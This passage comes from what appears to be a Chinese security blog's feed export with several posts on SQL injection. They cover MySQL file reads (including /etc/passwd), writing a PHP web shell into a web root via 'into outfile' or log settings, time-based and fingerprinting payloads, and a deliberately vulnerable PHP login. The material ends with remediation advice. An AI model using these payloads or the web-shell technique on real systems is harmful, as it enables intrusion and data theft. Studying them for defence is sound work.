</li><li>启动项添加参数：mysqld.exe –secure-file-priv&#x3D;</li></ul></li></ul><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>在确定了用户有读，写权限之后，一般使用load_file()函数来读取文件内容  </p><p><strong>限制条件：</strong>  </p><ul><li>前两种需要secure-file-priv无值或为有利目录  </li><li>都需要知道读取文件所在的绝对路径  </li><li>要读取的闻不见大小必须小于系统变量max_allowed_packet所设置的值  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(file_path)  </span><br><span class="line">load data infile &quot;/etc/passwd&quot; <span class="keyword">into</span> <span class="keyword">table</span> test FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\n&#x27;</span>; <span class="comment">-- 读取服务端上的文件  </span></span><br><span class="line">load data <span class="keyword">local</span> infile &quot;/etc/passwd&quot; <span class="keyword">into</span> <span class="keyword">table</span> test FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\n&#x27;</span>; <span class="comment">-- 读取客户端上的文件  </span></span><br></pre></td></tr></table></figure></li></ul><h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>常规写文件主要利用了into oufile和into dumpfile  </p><p><strong>限制条件：</strong>  </p><ul><li>secure-file-priv无值或为可利用的目录  </li><li>需要知道目标目录的绝对路径  </li><li>目标目录可写，mysql的权限足够</li></ul><p>outfile和dumpfile区别：  </p><ul><li>into outfile是导出所有数据，适合导出库，但是如果用它去导出二进制文件时，就会出错，因为outfile函数会在行末端写入新行，更致命的是会转义换行符，这样的话这个二进制可执行文件就会被破坏  </li><li>into dumpfile 只能导出一行数据，一般导出导出二进制文件(udf提权)时就用dumpfile<br><strong>利用语句：</strong>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php @assert($_POST[&#x27;t&#x27;]);?&gt;&quot; <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/1.php&#x27;</span>  </span><br><span class="line"><span class="keyword">select</span> &quot;&lt;?php @assert($_POST[&#x27;t&#x27;]);?&gt;&quot; <span class="keyword">into</span> dumpfile <span class="string">&#x27;/var/www/html/1.php&#x27;</span>  </span><br></pre></td></tr></table></figure></li></ul><h2 id="日志-getshell"><a href="#日志-getshell" class="headerlink" title="日志 getshell"></a>日志 getshell</h2><p>由于mysql在5.5.53版本之后，secure-file-priv的值默认为NULL，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过  </p><p><strong>限制条件：</strong>  </p><ul><li>权限够，可以进行日志的设置操作  </li><li>知道目标的据对路径<br>mysql日志文件的一些相关设置可以直接通过命令来进行<br><strong>利用语句：</strong>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">set</span> <span class="keyword">global</span> genneral_log_file<span class="operator">=</span><span class="string">&#x27;var/www/html/1.php&#x27;</span>;  </span><br><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">set</span> <span class="keyword">global</span> genneral_log <span class="operator">=</span><span class="keyword">on</span>;  </span><br><span class="line">  </span><br><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;var/www/html/2.php&#x27;</span>;  </span><br><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log<span class="operator">=</span><span class="number">1</span>;  </span><br></pre></td></tr></table></figure></li></ul><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL常用符号</title>
      <link href="/blog/MySQL%E5%B8%B8%E7%94%A8%E7%AC%A6%E5%8F%B7/"/>
      <url>/blog/MySQL%E5%B8%B8%E7%94%A8%E7%AC%A6%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h1><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><table><thead><tr><th>注释符</th><th>说明</th></tr></thead><tbody><tr><td>#(%23)</td><td>单行注释<br>在URL中#表示锚点，也就是hash路由，带上#不会请求后端路由，而是刷新前端路由，所以测试一般用URL编码后的%23</td></tr><tr><td>–<br>– -<br>&#x3D;–+</td><td>单行注释<br>注意–后还有一个空格；其中+号会被URL解码为空格</td></tr><tr><td>&#x2F;**&#x2F;</td><td>多行(内联)注释<br>一般用于绕过WAF、代替空格等</td></tr></tbody></table><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><table><thead><tr><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>与，同and</td></tr><tr><td>||</td><td>或，同or</td></tr><tr><td>！</td><td>非，同not</td></tr><tr><td>^</td><td>异或，同xor</td></tr><tr><td>\</td><td>转义符</td></tr><tr><td>~</td><td>一元比特反转</td></tr><tr><td>&lt;&lt;</td><td>左移</td></tr><tr><td>&gt;&gt;</td><td>右移</td></tr><tr><td>+</td><td>加，URL解码后可代替空格</td></tr><tr><td>-</td><td>减法</td></tr><tr><td>*</td><td>乘法</td></tr><tr><td>&#x2F;或div</td><td>除法</td></tr><tr><td>%或mod</td><td>取余</td></tr><tr><td>&#x3D;</td><td>等于</td></tr><tr><td>&lt;&gt;,!&#x3D;</td><td>不等于</td></tr><tr><td>&gt;</td><td>大于</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>between</td><td>在两值之间</td></tr><tr><td>not between</td><td>不在两值之间</td></tr><tr><td>in</td><td>在集合中</td></tr><tr><td>not in</td><td>不在集合中</td></tr><tr><td>&lt;&#x3D;&gt;</td><td>严格比较两个NULL值是否相等</td></tr><tr><td>like</td><td>模糊匹配</td></tr><tr><td>regexp或rlike</td><td>正则式匹配</td></tr><tr><td>is null</td><td>为空</td></tr><tr><td>is not null</td><td>不为空</td></tr></tbody></table><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>所有全局变量可通过如下语句查看：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables;</span><br><span class="line"><span class="keyword">show</span> variaves;</span><br></pre></td></tr></table></figure><table><thead><tr><th>变量</th><th>说明</th></tr></thead><tbody><tr><td>@@version</td><td>返回版本信息</td></tr><tr><td>@@global.version</td><td>同@@version</td></tr><tr><td>@@hostname</td><td>返回安装计算机名称</td></tr><tr><td>@@basedir</td><td>返回mysql绝对路径</td></tr><tr><td>@@datadir</td><td>数据路径</td></tr></tbody></table><h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><h2 id="数据库信息"><a href="#数据库信息" class="headerlink" title="数据库信息"></a>数据库信息</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>user()</td><td>获取当前操作句柄的用户名，同session_user()、current_user(),有时也用system_user()</td></tr><tr><td>databse()</td><td>获取当前选择数据库名，同schema()</td></tr><tr><td>version()</td><td>获取当前版本信息</td></tr></tbody></table><h2 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>ascii(str)</td><td>返回字符串第一个字符的ascii值</td></tr><tr><td>ord(str)</td><td>同ascii(str)</td></tr><tr><td>hex(n_s)</td><td>参数为字符串时，返回n or s的16进制字符串形式；为数字时，返回其16进制数形式</td></tr><tr><td>unhex(str)</td><td>hex(str)的逆向函数将参数中的每一对16进制数字都转换为10进制数字，然后再转换成ascii码所对应的字符</td></tr><tr><td>bin(n)</td><td>返回十进制数值n的二进制数值的字符串表现形式n时一个bigint型数值，作用相当于conv(n,10,2)</td></tr><tr><td>oct(n)</td><td>返回十进制n的八进制数值的字符串表现形式</td></tr><tr><td>conv(n,f,t)</td><td>将数值型参数n由初始进制f转换为目标进制t的形式并返回</td></tr><tr><td>char(n,…)</td><td>将每一个参数n都解释为整数，返回由这些整数再ascii码中对应字符所组成的字符串</td></tr></tbody></table><h2 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>substr(str,n_start,n_length)</td><td>对指定字符串进行截取，为substring的简单版<br>str:截取的字符串<br>n_start:截取起始位置(mysql中start从1开始)<br>n_length:截取长度</td></tr><tr><td>substring(str,start)<br>substring(str,start,len)<br>substring(str from start)<br>substring(str from strat for len)</td><td>对指定字符串进行截取，有多种形式<br>str:截取的字符串<br>start:截取起始位置(mysql中start从1开始)<br>len:截取长度</td></tr><tr><td>mid(str,pos,len)</td><td>同substring(str,pos,len)</td></tr><tr><td>right(str,len)</td><td>对指定字符串从最右边截取指定长度</td></tr><tr><td>left(str,len)</td><td>对指定字符串从最左边截取指定长度</td></tr><tr><td>rpad(str,len,padstr)</td><td>在str右方补齐len位的字符串padstr，返回新字符串如果str长度大于len，则返回的长度将缩减到le所指定的长度</td></tr><tr><td>lpad(str,len,padstr)</td><td>与rpad显示，在str左边补齐</td></tr><tr><td>insert(str,pos,len,newstr)</td><td>在原始字符串str中，将自左第pos位开始，长度为len个字符的字符串替换为新字符串newstr，然后返回经过替换后的字符串。insert(str,len,1,0x0)可当作截取函数</td></tr></tbody></table><h2 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>concat(str1,str2)</td><td>函数用于将多个字符串合并为一个字符串</td></tr><tr><td>concat_ws（sep,str1,str2）</td><td>和concat函数类似，通过分隔符sep连接到一起</td></tr><tr><td>group_concat(…）</td><td>返回一个非字符串结果，该结果由分组中的值通过逗号连接组合而成</td></tr><tr><td>make_set(bits,str1,str2)</td><td>返回一个设定值(含子字符串分割字符串”,”字符)，在设置位的相应位字符串可用作布尔盲注，如:exp(make_set((length(database())&gt;8)+1,’1’,’710’))</td></tr></tbody></table><h2 id="数据匹配"><a href="#数据匹配" class="headerlink" title="数据匹配"></a>数据匹配</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>&#x3D; statement</td><td>全匹配</td></tr><tr><td>like “statement”</td><td>匹配数据,%代表任意内容</td></tr><tr><td>regexp “statement”</td><td>正则匹配数据</td></tr><tr><td>rliek “statement”</td><td>同regexp</td></tr></tbody></table><h2 id="条件函数"><a href="#条件函数" class="headerlink" title="条件函数"></a>条件函数</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>if(exp,state1,state2)</td><td>条件语句，exp为true，执行state1，否则执行state2</td></tr><tr><td>case…when exp then state1 else state2 end</td><td>同if，…可直接省略</td></tr><tr><td>nullif(expr1,expr2)</td><td>若expr1与expr2相同，则返回expr1，否则返回NULL</td></tr></tbody></table><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>sleep(n)</td><td>休眠n秒</td></tr><tr><td>benchmark(count,expr)</td><td>将表达式expr重复运行count次(消耗cpu)，可以达到sleep的效果</td></tr><tr><td>order by</td><td>用于对结果集进行排序，默认按照升序进行排序</td></tr><tr><td>exists(sql)</td><td>判断sql语句执行后是否由结果；若存在的话返回结果为1，不存在的话返回结果为0</td></tr><tr><td>limit m,n</td><td>查询结果从m开始取n个</td></tr><tr><td>length(str)</td><td>返回字符串的长度</td></tr><tr><td>load_file(filepath)</td><td>读取文件内容，可以将文件名转换成ascii码或者十六进制形式；secure_file_priv默认情况下为null不允许读文件<br>ascii码需要用char()函数，char(96,97)<br>十六进制前面要加上0x<br>读取内容不显示的情况下，可以用hex()函数:hex(load_file())</td></tr><tr><td>PI()</td><td>返回PI的具体数值</td></tr><tr><td>locate(substr,str,[pos])</td><td>返回子字符串第一次出现的位置</td></tr><tr><td>position(substr IN str)</td><td>等同于 locate()</td></tr><tr><td>lower(str)</td><td>将字符串大写字母转换为小写字母同:lcase(str)</td></tr><tr><td>upper(str)</td><td>将字符串小写字母转换为大写字母同:ucase(str)</td></tr><tr><td>elt(n,str1,str2,…)</td><td>与make_set(bit,str1,str2…)类似，根据N返回参数值</td></tr><tr><td>charset(str)</td><td>返回字符串所使用的字符集</td></tr><tr><td>decode(cr_str,pass_str)</td><td>使用pass_str作为密码，解密加密字符串cr_str。加密函数:encode(str,pass_str)</td></tr></tbody></table><h1 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h1><table><thead><tr><th>说明</th><th>语句</th></tr></thead><tbody><tr><td>基础信息</td><td>获取数据库版本信息<br>select version();<br>select @@innodb_version;<br>获取当前用户<br>select user();<br>获取当前数据库<br>select database();<br>数据路径<br>select @@datadir;</td></tr><tr><td>获取所有数据库</td><td>select shema_name from information_schema.schemata;</td></tr><tr><td>获取所有用户</td><td>查看表结构<br>desc mysql.user<br>获取所有用户信息<br>select * from mysql.user</td></tr><tr><td>获取数据库表名</td><td>desc information_schema.tables;<br><br>select table_name from information_schema.tables where table_schema &#x3D; database();<br><br>select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database();</td></tr><tr><td>获取当前数据库的某表的列名</td><td>select column_name from information_schema.columns where table_name &#x3D; ‘表名’;<br>select group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘表名’;</td></tr><tr><td>获取当前数据库中某列的值</td><td>select id ,username,password from users;</td></tr><tr><td>查询DBA账户(一般为root)</td><td>select host, user from mysql.user where super_priv &#x3D; ‘y’;</td></tr></tbody></table><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入数据库识别</title>
      <link href="/blog/sql%E6%B3%A8%E5%85%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%86%E5%88%AB/"/>
      <url>/blog/sql%E6%B3%A8%E5%85%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%86%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>确认注入点后，我们需要识别后端所使用的数据库，因为不同的数据库注入的方式不一样，后期利用手法和条件也不一样。</p><div class="note purple no-icon flat"><p>核心就是利用数据库<strong>特有的一些语法或者时函数</strong>来判断即可，毕竟要满足该数据库的语法后SQL语句才能正常执行；下面的例子不全面，只是给大家提供一个思路，最明显的就是<strong>休眠函数</strong></p></div><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><table><thead><tr><th>描述</th><th>语句</th></tr></thead><tbody><tr><td>sleep函数</td><td>1’-sleep(1)&#x3D;0 limit 1 –</td></tr><tr><td>banchmark函数</td><td>1’-banchmark(5000000,encode(‘Slow Down’,’by 5 seconds’))&#x3D;0 limit 1 –</td></tr><tr><td>字符串连接</td><td>id&#x3D;’ ‘mysql’ –<br>id&#x3D;’ and concat(‘some’,’string’)</td></tr><tr><td>版本信息</td><td>select @@version<br>select version()</td></tr><tr><td>错误消息</td><td>id&#x3D;’<br></td></tr><tr><td>特有函数</td><td>select connection_id()<br>select last_insert_id<br>select row_count()</td></tr></tbody></table><h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><table><thead><tr><th>描述</th><th>语句</th></tr></thead><tbody><tr><td>字符串连接</td><td>id&#x3D;’ ‘oracle’ –a&#96;</td></tr><tr><td>默认表</td><td>id&#x3D;’union select 1 from v$version – <br>select banner from v$version<br>select banner from v$version where rownum&#x3D;1</td></tr><tr><td>错误消息</td><td>id&#x3D;’</td></tr></tbody></table><h1 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h1><table><thead><tr><th>描述</th><th>语句</th></tr></thead><tbody><tr><td>waitfor函数</td><td>‘;waitfor delay ‘00:00:10’; –</td></tr><tr><td>堆叠查询默认变量</td><td>sql’;select @@servername –</td></tr><tr><td>错误消息</td><td>id&#x3D;’</td></tr><tr><td>错误消息（id整数，@@servername转换错误）</td><td>id&#x3D;@@servername<br>id&#x3D;0&#x2F;@@servername</td></tr><tr><td>常量</td><td>@@pack_received<br>@@rowcount</td></tr></tbody></table><h1 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h1><table><thead><tr><th>描述</th><th>语句</th></tr></thead><tbody><tr><td>字符串连接</td><td>id&#x3D;’ ‘postgresql’ –a</td></tr><tr><td>休眠函数</td><td>id&#x3D;’ and (select pg_sleep_for(‘5 sec’)) is null – a</td></tr></tbody></table><h1 id="一些经验"><a href="#一些经验" class="headerlink" title="一些经验"></a>一些经验</h1><table><thead><tr><th>方法</th><th>数据库</th></tr></thead><tbody><tr><td>常用搭配</td><td>asp &#x3D;&gt; mssql、access<br>aspx &#x3D;&gt; mssql<br>php &#x3D;&gt; mysql\postgresql<br>java &#x3D;&gt; mysql、oracle、mssql</td></tr><tr><td>默认端口</td><td>oracle &#x3D;&gt; 1521<br>mssql &#x3D;&gt; 1433<br>mysql &#x3D;&gt; 3306<br>postgresql &#x3D;&gt; 5432</td></tr><tr><td>数据库特有函数</td><td>pg_sleep() &#x3D;&gt; postgresql<br>benchmark &#x3D;&gt; mysql<br>waitfor delay &#x3D;&gt; mssql<br>dbms_pipe.receive_message() &#x3D;&gt; oracle</td></tr><tr><td>特殊符号</td><td>；&#x3D;&gt; postgresql、mssql默认可堆叠查询<br># &#x3D;&gt; MySQL注释符</td></tr></tbody></table><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入点检测</title>
      <link href="/blog/sql%E6%B3%A8%E5%85%A5%E7%82%B9%E6%A3%80%E6%B5%8B/"/>
      <url>/blog/sql%E6%B3%A8%E5%85%A5%E7%82%B9%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>挖掘SQL注入漏洞的第一步，就是发现SQL注入漏洞，只有发现了注入点才能够继续深入利用。</p><p>可以通过多种方式来检测是否存在注入，最简单的就是直接在参数后面加上<code>&#39;</code> 或者<code>&quot;</code>等特殊字符让web应用程序抛出异常；但这种情况已经很少见了，比较好的方法是通过盲注来进行判断；</p><h1 id="注入点位置"><a href="#注入点位置" class="headerlink" title="注入点位置"></a>注入点位置</h1><p>所有和数据库有交互的地方均可能存在SQL注入，因此我们在分析数据包的时候， 可以关注一下哪些数据可能会和数据库交互，从而进行测试是否存在SQL注入漏洞。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /?<span class="built_in">id</span>=homePage* HTTP/<span class="number">1.1</span></span><br><span class="line">Host: www.netspi.com*</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">62.0</span><span class="number">.3202</span><span class="number">.94</span> Safari/<span class="number">537.36</span>*</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,image/apng,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=<span class="number">0.9</span></span><br><span class="line">X-Server-Name: PROD*</span><br><span class="line">Cookie: user=harold;*</span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">username=harold*&amp;email=harold@netspi.com*</span><br></pre></td></tr></table></figure><blockquote><p>如果传输的是json格式的数据，在使用双引号闭合时，记得使用\来防止破坏json数据结构，如下，其他特殊结构数据类似<br>{“username”:”test&quot;“}</p></blockquote><h1 id="注入检测"><a href="#注入检测" class="headerlink" title="注入检测"></a>注入检测</h1><p>检测是否存在注入一般通过两种方式来判断：</p><ol><li>输入特殊字符是否抛出相关异常</li><li>输入一些语句运行是否达到我们预期的结果（返回内容、响应时间等）</li></ol><table><thead><tr><th>类型</th><th>语句和结果</th></tr></thead><tbody><tr><td>特殊字符</td><td>id&#x3D;’)”)</td></tr><tr><td>逻辑算数测试</td><td>id&#x3D;’ and 2*3&#x3D;6 – true<br>id&#x3D;’ and 2*3&#x3D;5 – false<br>id&#x3D;2*3 是否返回id&#x3D;6内容<br>id&#x3D;1&#x2F;1 true<br>id&#x3D;1&#x2F;0 false</td></tr><tr><td>返回延时</td><td>id&#x3D; ‘ and sleep(5) 延迟5秒或更久</td></tr></tbody></table><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/blog/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/blog/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SQL注入是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了字符检查，那么这些注入进去的恶意指令就会被数据库服务器误认为是正常的SQL指令而执行，因此遭到破坏或是入侵。</p><h1 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h1><p>SQL注入漏洞产生的原因是网站应用程序在编写时未对用户提交至服务器的数据进行合法性校验（类型、长度、业务参数合法性、敏感字符等），同时没有对用户输入数据进行有效地特殊字符过滤，使得用户的输入直接带入数据库进行执行，超出了SQL语句原来设计的预期结果，导致了SQL注入漏洞。</p><h1 id="注入举例"><a href="#注入举例" class="headerlink" title="注入举例"></a>注入举例</h1><p>以下代码为模拟web应用程序进行登录炒作。若登录成功返回success，失败则返回fail</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where username = &#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$rs</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rs</span>-&gt;<span class="title function_ invoke__">fetch_row</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用户名<code>username</code>和密码<code>password</code>均来之用户的直接传入，无任何过滤，后直接拼接到SQL语句中。<br>正常用户登录时，SQL语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;password&#x27;</span></span><br></pre></td></tr></table></figure><p>攻击者尝试登录，输入用户名<code>admin’ or &#39;1&#39;=&#39;1</code>,输入密码123，因为是直接拼接，所以构造出的sql语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure><p>此时因为sql语句中存在or ‘1’&#x3D;‘1’，所以永为真，将会查询出所有的结果，也就会登录成功返回success。(也就是万能密码)</p><h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p><strong>SQL注入漏洞可能出现在一切数据库交互的地方，常见举例如下：</strong></p><blockquote><p>简而言之：所有和数据库交互的点均可能存在SQL注入</p></blockquote><table><thead><tr><th align="left">关键字</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">增</td><td align="left">注册新用户、创建订单、添加文章……</td></tr><tr><td align="left">删</td><td align="left">删除用户、删除订单……</td></tr><tr><td align="left">改</td><td align="left">修改订单、更新用户信息……</td></tr><tr><td align="left">查</td><td align="left">查询信息、筛选订单、搜索文章……</td></tr></tbody></table><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><ol><li>获取数据库访问权限，甚至获得DBA权限，从而获取数据库中所有数据，造成信息泄露；（可获取数据）</li><li>对数据库进行增删改操作，例如删除数据库中重要数据库的表（可进行增删改操作）</li><li>通过构造特殊的数据库语句，可操作数据库进入后台或插入木马，以获取整个网站和数据库的控制权限，篡改网页，发布不良信息等。（可获取网站权限）</li><li>获取服务器最高权限，远程控制服务器，甚至导致局域网被入侵；（可获取服务器权限）</li></ol><h1 id="通用修复建议"><a href="#通用修复建议" class="headerlink" title="通用修复建议"></a>通用修复建议</h1><h2 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h2><h3 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h3><ol><li>严格控制输入数据的类型；如通过id获取用户信息时，仅允许传入的id为整行</li><li>严格控制输入数据的长度；如限制用户名长度应小于20</li><li>输入合法性判断；禁止出现一些特殊字符或关键词<ul><li>‘ , “ , \ , &lt; , &gt; , &amp; ,* , ; , # , select , from , where, sub , if , union , sleep , and , or 等</li></ul></li><li>对所有可能的输入点进行判断检查，如UA、IP、Cookie等</li></ol><h3 id="预编译SQL语句（参数化查询）"><a href="#预编译SQL语句（参数化查询）" class="headerlink" title="预编译SQL语句（参数化查询）"></a>预编译SQL语句（参数化查询）</h3><p>参数化查询是一种查询类型，其中占位符用于填充参数，参数值在执行时提供。原理是采用了预编译的方法，先将SQL语句中可被用户控制的参数集进行编译，生成对应的变量集，再使用对应的设置方法，为临时变量集里面的元素进行赋值，赋值过程中会对传入的参数进行强制类型检查和安全检查。</p><p>所有与数据库交互的业务接口均采用参数化查询，参数化的语句使用参数而不是将用户输入变量直接嵌入到SQL语句中，参数化查询是防御SQL注入的最佳方法，比如：Java中的<code>PreparedStatement</code>，PHP中的<code>PDO</code>等。</p><h2 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h2><h3 id="最小权限原则"><a href="#最小权限原则" class="headerlink" title="最小权限原则"></a>最小权限原则</h3><p>遵循最小化权限原则，严格限制网站用户的数据库操作权限，禁止将任何高权限账户（sa，dba，root等）用于应用程序数据库访问，从而最大限度的减少注入攻击对数据库的危害。</p><h3 id="禁用敏感函数"><a href="#禁用敏感函数" class="headerlink" title="禁用敏感函数"></a>禁用敏感函数</h3><p>防止攻击者通过SQL注入获取到除数据库外的其他更高权限，如系统权限等；<br>比如MSSQL中，拒绝用户访问敏感的系统存储过程，如xp_dirtree、xp_xmdshell等。</p><h3 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h3><p>限制用户仅能够访问必须使用的数据库表。</p><h3 id="统一编码"><a href="#统一编码" class="headerlink" title="统一编码"></a>统一编码</h3><p>网站与数据层的编码统一，建议全部使用UTF-8编码，避免上下层编码不一致导致一些过滤模型被绕过，比如宽字节注入等。</p><h2 id="其他层面"><a href="#其他层面" class="headerlink" 